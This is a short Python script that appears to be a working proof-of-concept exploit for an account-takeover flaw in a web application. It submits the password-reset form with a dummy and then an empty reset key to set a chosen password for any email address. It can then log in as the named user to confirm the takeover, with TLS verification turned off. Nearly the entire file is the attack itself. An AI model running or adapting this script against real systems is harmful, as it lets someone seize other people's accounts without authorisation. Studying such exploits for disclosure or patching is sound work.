#!/usr/bin/env python3
# pylint: disable=C0103
#
# requires requests and lxml library
# pip3 install requests lxml
#
import sys
from urllib.parse import urljoin
import lxml.html
import requests

try:
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
except:
    pass

if len(sys.argv) < 4:
    print("")
    print("usage:")
    print("%s http://target/ email newpassword [username]" % sys.argv[0])
    print("")
    print("If username is specified then login will be attempted to verify password change.")
    print("")
    sys.exit()

TARGET = sys.argv[1]
USER_EMAIL = sys.argv[2]
USER_NEWPASS = sys.argv[3]
USER_NAME = sys.argv[4] if len(sys.argv) > 4 else ""


def get_form(getpath, formname, params=None):
    resp = session.get(urljoin(TARGET, getpath), params=params)
    tree = lxml.html.fromstring(resp.content)
    form = tree.xpath('//form[@name="%s"]' % formname)
    if not form:
        return None
    form = form[0]
    formdata = {}
    for element in form.xpath('.//input'):
        formdata[element.name] = element.value if element.value else ""
    return (form.action, formdata)


def post_form(formaction, data, params=None):
    return session.post(urljoin(TARGET, formaction), params=params, data=data, allow_redirects=False)


session = requests.Session()
session.verify = False

print("Get reset form")
form = get_form("/", "frmZConfirm", {"resetkey": "dummy"})

print("Reset password")
formaction, formdata = form
formdata["inConfEmail"] = USER_EMAIL
formdata["inNewPass"] = formdata["inputNewPass2"] = USER_NEWPASS
resp = post_form(formaction, formdata, {"resetkey": ""})

if USER_NAME:
    #session.cookies.clear()
    print("Test login")
    print("Get login form")
    form = get_form("/", "frmZLogin")

    print("Login")
    formaction, formdata = form
    formdata["inUsername"] = USER_NAME
    formdata["inPassword"] = USER_NEWPASS
    resp = post_form(formaction, formdata)
    if "invalidlogin" in resp.headers.get("location", ""):
        print("Failed!")
        sys.exit()
    print("OK")
    session.get(urljoin(TARGET, "/?logout"))